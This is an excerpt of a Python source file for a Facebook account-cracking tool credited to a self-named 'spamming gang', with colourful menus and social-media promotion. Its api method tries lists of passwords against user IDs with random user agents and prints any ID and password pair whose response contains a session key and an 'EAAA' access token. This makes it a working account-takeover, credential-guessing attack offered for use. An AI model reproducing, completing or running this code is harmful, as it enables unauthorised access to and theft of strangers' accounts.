#THE TOOL CREATED BY DEVIL
#DARK ARMY SPAMMING GANG BD
#FB : https://www.facebook.com/N41M01
#PAGE : Devil Najmul
#Programer DEVIL NAJMUL
#𝐖𝐇𝐀𝐓'𝐒 𝐀𝐏𝐏 : 01977-073308
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
class Main:
	def __init__(self):
		...
		print("╚══════════════════════════════════════════════════════════╝")
		print("\033[1;32m [1] 𝐹𝐴𝑆𝑇 𝐹𝑂𝐿𝐿𝑂𝑊 𝑀𝑌 𝐹𝐴𝐶𝐸𝐵𝑂𝑂𝐾 𝑃𝐴𝐺𝐸🥰")
		print("\033[1;33m [2] 𝐸𝑋𝐼𝑇")
		print("")
		syed = input("\n\033[1;36m  𝐶𝐻𝑂𝑆𝐸 ==> \033[1;32m")
		if syed in ["", " "]:
			exit()
		elif syed in ["2", "02"]:
			print("    𝐴𝐵𝐴𝐿 𝑀𝐴𝑅𝐾𝐴 𝑃𝑈𝐿𝐴 𝑃𝐴𝐼𝑁😅")
			exit()
		elif syed in ["1", "01"]:
			os.system("xdg-open https://github.com/....")
			print("")
			time.sleep(2.0)
			print("\033[1;33m   𝐸𝑁𝑇𝐸𝑅 𝑌𝑂𝑈'𝑅 𝐺𝐹 𝑁𝐴𝑀𝐸")
			print("")
			input("\n\033[1;32m  𝑇𝑌𝑃𝐸 𝑌𝑂𝑈𝑅 𝐸𝑋 𝐺𝐹 𝑁𝐴𝑀𝐸 ==> \033[1;36m")
			time.sleep(2.1)
			print("")
			print("\033[1;32m  𝑆𝑈𝐶𝐶𝐸𝑆𝑆𝐹𝑈𝐿𝐿 𝐵𝑅𝑂 𝑃𝐿𝑍 𝑊𝐼𝑇𝐸...")
			print("\033[1;32m  𝑇𝐻𝐸 𝑇𝑂𝑂𝐿 𝐶𝑅𝐴𝑇𝐸𝐷 𝐵𝑌 𝐷𝐸𝑉𝐼𝐿 𝑁𝐴𝐽𝑀𝑈𝐿")
			time.sleep(2.0)
			os.system("clear")
		print(logo)
		print("\033[0;90m╔══════════════════════════════════════════════════════════╗")
		print('\x1b[1;32m [1]\x1b[1;35m 𝐂𝐎𝐍𝐈𝐍𝐆 𝐎𝐈𝐃 𝐈𝐃 2006-2010 ')
		...
		print(' \x1b[1;32m[5] \x1b[1;31m𝐽𝑜𝑖𝑛 𝑀𝑌 𝐹𝑏 𝐺𝑟𝑜𝑢𝑝')
		...
		if DEVIL in ["4", "04"]:
			os.system('xdg-open https://facebook.com/groups/363232170814743/')
		if DEVIL in ["5",  "05"]:
	...
	def fbtua(self):
		...
		try:
			...
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[𝐓𝐇𝐀𝐍𝐊'𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆 𝐃𝐄𝐕𝐈𝐋 𝐓𝐎𝐎𝐋'𝐒...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[92;1m[𝐃𝐄𝐕𝐈𝐋] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [𝐃𝐄𝐕𝐈𝐋🥱] %s | %s\033[1;32m         "%(uid, pw))
